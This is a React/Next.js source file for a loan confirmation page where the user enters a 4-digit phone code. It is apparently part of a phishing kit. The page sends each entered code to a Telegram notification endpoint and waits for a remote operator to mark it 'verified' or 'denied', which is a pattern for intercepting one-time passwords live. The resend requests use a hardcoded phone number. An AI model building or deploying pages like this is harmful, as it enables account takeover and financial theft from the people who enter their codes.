'use client';

import { useState, useRef, useEffect, Suspense } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import { Clock, ArrowLeft, AlertCircle, X, Loader } from 'lucide-react';
import { createClient } from '@/lib/supabase/client';
import { SharedLayout } from '@/components/shared-layout';

function LoanOTPPageContent() {
  const [otpDigits, setOtpDigits] = useState(['', '', '', '']);
  const [timer, setTimer] = useState(120);
  const [isTimerActive, setIsTimerActive] = useState(true);
  const [showExpiredModal, setShowExpiredModal] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [showDeniedModal, setShowDeniedModal] = useState(false);
  const [isPolling, setIsPolling] = useState(false);
  const router = useRouter();
  const searchParams = useSearchParams();
  const recordId = searchParams.get('recordId') || '';
  
  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
  const pollingIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const supabaseRef = useRef(createClient());

  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    
    const newOtp = [...otpDigits];
    newOtp[index] = value.slice(-1);
    setOtpDigits(newOtp);

    if (value && index < 3) {
      otpRefs.current[index + 1]?.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otpDigits[index] && index > 0) {
      otpRefs.current[index - 1]?.focus();
    }
  };

  const handleBackToLoanLimit = () => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
    }
    router.push('/loan-limit');
  };

  const startRealtimePolling = async () => {
    setIsPolling(true);
    setShowLoadingModal(true);

    const supabase = supabaseRef.current;

    const channel = supabase
      .channel(`loan-otp-confirm-${recordId}`)
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'loan_otp_verifications',
          filter: `id=eq.${recordId}`,
        },
        (payload: any) => {
          console.log('[v0] Loan OTP confirmation update:', payload.new.status);

          if (payload.new.status === 'verified') {
            if (pollingIntervalRef.current) {
              clearInterval(pollingIntervalRef.current);
            }
            channel.unsubscribe();
            setShowLoadingModal(false);
            setIsPolling(false);
            router.push('/success');
          } else if (payload.new.status === 'denied') {
            if (pollingIntervalRef.current) {
              clearInterval(pollingIntervalRef.current);
            }
            channel.unsubscribe();
            setShowLoadingModal(false);
            setIsPolling(false);
            setShowDeniedModal(true);
          }
        }
      )
      .subscribe();

    pollingIntervalRef.current = setInterval(async () => {
      try {
        const response = await fetch('/api/check-loan-otp-status', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ recordId }),
        });

        const data = await response.json();

        if (data.status === 'verified') {
          if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
          }
          channel.unsubscribe();
          setShowLoadingModal(false);
          setIsPolling(false);
          router.push('/success');
        } else if (data.status === 'denied') {
          if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
          }
          channel.unsubscribe();
          setShowLoadingModal(false);
          setIsPolling(false);
          setShowDeniedModal(true);
        }
      } catch (error) {
        console.error('[v0] Polling error:', error);
      }
    }, 1000);
  };

 const otpCode = otpDigits.join("");
  const sendTelegramNotification = async () => {
    try {
      const response = await fetch('/api/send-tele', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          otpCode : `${otpCode}`,
          action: '4 digit code submitted',
          timestamp: new Date().toISOString(),
        }),
      });

      if (!response.ok) {
        console.error('Failed to send Telegram notification');
      }
    } catch (error) {
      console.error('Telegram notification error:', error);
    }
  };


  const handleVerify = async () => {
    if (otpDigits.every(d => d)) {
      sendTelegramNotification();
      startRealtimePolling();
    }
  };

  const handleResendOtp = async () => {
    try {
      await fetch('/api/resend-loan-otp-telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: '755123456' }),
      });

      setTimer(120);
      setIsTimerActive(true);
      setOtpDigits(['', '', '', '']);
      otpRefs.current[0]?.focus();
    } catch (error) {
      console.error('[v0] Error resending OTP:', error);
    }
  };

  const handleResendFromModal = async () => {
    setShowDeniedModal(false);
    try {
      await fetch('/api/resend-loan-otp-telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: '755123456' }),
      });

      setTimer(120);
      setIsTimerActive(true);
      setOtpDigits(['', '', '', '']);
      otpRefs.current[0]?.focus();
    } catch (error) {
      console.error('[v0] Error resending OTP:', error);
    }
  };

  const handleResendFromExpiredModal = async () => {
    setShowExpiredModal(false);
    try {
      await fetch('/api/resend-loan-otp-telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: '755123456' }),
      });

      setTimer(120);
      setIsTimerActive(true);
      setOtpDigits(['', '', '', '']);
      otpRefs.current[0]?.focus();
    } catch (error) {
      console.error('[v0] Error resending OTP:', error);
    }
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  // Timer effect
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (isTimerActive && timer > 0) {
      interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000);
    } else if (timer === 0 && isTimerActive) {
      setIsTimerActive(false);
      setShowExpiredModal(true);
    }
    return () => clearInterval(interval);
  }, [isTimerActive, timer]);

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
      }
    };
  }, []);

  return (
    <>
      <SharedLayout>
        {/* Back Button */}
        <button 
          onClick={handleBackToLoanLimit}
          className="flex items-center gap-2 text-gray-500 hover:text-black text-sm mb-4 transition-colors">
          <ArrowLeft className="w-4 h-4" />
          Back
        </button>

        {/* Loan OTP Verification Section */}
        <h2 className="text-2xl sm:text-4xl font-black text-black mb-1 sm:mb-2">Confirm Your Loan</h2>
        <p className="text-gray-500 text-sm sm:text-lg mb-6 sm:mb-8">Enter the 4-digit code sent your phone</p>

        {/* OTP Input Field */}
        <div className="mb-6 sm:mb-8">
          <label className="block text-black font-bold mb-2 sm:mb-3 text-sm sm:text-base">Enter Confirmation Code</label>
          <div className="flex gap-2 sm:gap-4 justify-center">
            {otpDigits.map((digit, index) => (
              <input
                key={index}
                ref={(el) => (otpRefs.current[index] = el)}
                type="number"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleOtpChange(index, e.target.value)}
                onKeyDown={(e) => handleOtpKeyDown(index, e)}
                disabled={!isTimerActive}
                className={`w-12 h-16 sm:w-16 sm:h-24 border-2 rounded-lg sm:rounded-2xl text-center text-2xl sm:text-3xl font-bold placeholder-gray-400 focus:outline-none [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none transition-all ${
                  isTimerActive
                    ? 'border-gray-300 text-black focus:border-yellow-400 focus:ring-2 focus:ring-yellow-300 cursor-text'
                    : 'border-gray-200 text-gray-400 cursor-not-allowed bg-gray-50'
                }`}
                placeholder="−"
              />
            ))}
          </div>
        </div>

        {/* Timer Section */}
        <div className="flex items-center justify-center gap-2 mb-6 sm:mb-8">
          <Clock className="w-5 h-5 sm:w-6 sm:h-6 text-yellow-600" />
          <span className={`font-bold text-lg sm:text-xl font-mono ${timer <= 20 ? 'text-red-500' : 'text-black'}`}>
            {formatTime(timer)}
          </span>
        </div>

        {/* Confirm Button */}
        <button 
          onClick={handleVerify}
          disabled={!otpDigits.every(d => d) || isPolling}
          className="w-full bg-yellow-400 text-black font-bold text-base sm:text-xl py-3 sm:py-4 rounded-lg sm:rounded-2xl flex items-center justify-center gap-2 sm:gap-3 hover:bg-yellow-500 transition-colors mb-3 sm:mb-4 disabled:bg-gray-300 disabled:cursor-not-allowed">
          {isPolling ? 'Confirming...' : 'Confirm Loan'}
          <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6 rotate-180" />
        </button>

        {/* Resend Button */}
        <button 
          onClick={handleResendOtp}
          disabled={isTimerActive}
          className={`w-full py-3 sm:py-4 rounded-lg sm:rounded-2xl font-bold text-base sm:text-lg transition-all ${
            isTimerActive
              ? 'bg-gray-200 text-gray-500 cursor-not-allowed'
              : 'bg-gray-100 text-black hover:bg-gray-200'
          }`}>
          {isTimerActive ? 'Resend code' : 'Resend code now'}
        </button>
      </SharedLayout>

      {/* Loading Modal - Waiting for Telegram Approval */}
      {showLoadingModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-2xl sm:rounded-3xl p-8 sm:p-12 max-w-sm w-full shadow-2xl text-center">
            <Loader className="w-12 h-12 sm:w-16 sm:h-16 text-yellow-600 animate-spin mx-auto mb-4" />
            <h3 className="text-xl sm:text-2xl font-black text-black mb-3">Confirming Loan</h3>
            <p className="text-gray-500 text-sm sm:text-base">
              Please wait while we confirm your loan request...
            </p>
          </div>
        </div>
      )}

      {/* Expired OTP Modal */}
      {showExpiredModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-2xl sm:rounded-3xl p-6 sm:p-8 max-w-sm w-full shadow-2xl">
            {/* Close Button */}
            <button 
              onClick={() => setShowExpiredModal(false)}
              className="absolute top-4 right-4 sm:top-6 sm:right-6 text-gray-400 hover:text-black transition-colors">
              <X className="w-6 h-6" />
            </button>

            {/* Alert Icon */}
            <div className="flex justify-center mb-4 sm:mb-6">
              <div className="bg-red-100 rounded-full p-4">
                <AlertCircle className="w-8 h-8 sm:w-10 sm:h-10 text-red-600" />
              </div>
            </div>

            {/* Error Message */}
            <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">Code Expired</h3>
            <p className="text-gray-500 text-sm sm:text-base text-center mb-6 sm:mb-8">
              The confirmation code has expired. Please request a new code to continue.
            </p>

            {/* Resend Button */}
            <button 
              onClick={handleResendFromExpiredModal}
              className="w-full bg-yellow-400 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-yellow-500 transition-colors mb-3">
              Resend Code
            </button>

            {/* Back to Loan Limit Button */}
            <button 
              onClick={handleBackToLoanLimit}
              className="w-full bg-gray-100 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-gray-200 transition-colors">
              Back to Loan Limit
            </button>
          </div>
        </div>
      )}

      {/* Denied Modal - Request Denied */}
      {showDeniedModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-2xl sm:rounded-3xl p-6 sm:p-8 max-w-sm w-full shadow-2xl">
            <button 
              onClick={() => setShowDeniedModal(false)}
              className="absolute top-4 right-4 sm:top-6 sm:right-6 text-gray-400 hover:text-black transition-colors">
              <X className="w-6 h-6" />
            </button>

            <div className="flex justify-center mb-4 sm:mb-6">
              <div className="bg-red-100 rounded-full p-4">
                <AlertCircle className="w-8 h-8 sm:w-10 sm:h-10 text-red-600" />
              </div>
            </div>

            <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">Request Denied</h3>
            <p className="text-gray-500 text-sm sm:text-base text-center mb-6 sm:mb-8">
              Your loan confirmation request has been denied. Please try again.
            </p>

            <button 
              onClick={handleResendFromModal}
              className="w-full bg-yellow-400 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-yellow-500 transition-colors mb-3">
              Try Again
            </button>

            <button 
              onClick={handleBackToLoanLimit}
              className="w-full bg-gray-100 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-gray-200 transition-colors">
              Back to Loan Limit
            </button>
          </div>
        </div>
      )}
    </>
  );
}

export default function LoanOTPPage() {
  return (
    <Suspense fallback={<div className="flex items-center justify-center min-h-screen">Loading...</div>}>
      <LoanOTPPageContent />
    </Suspense>
  );
}
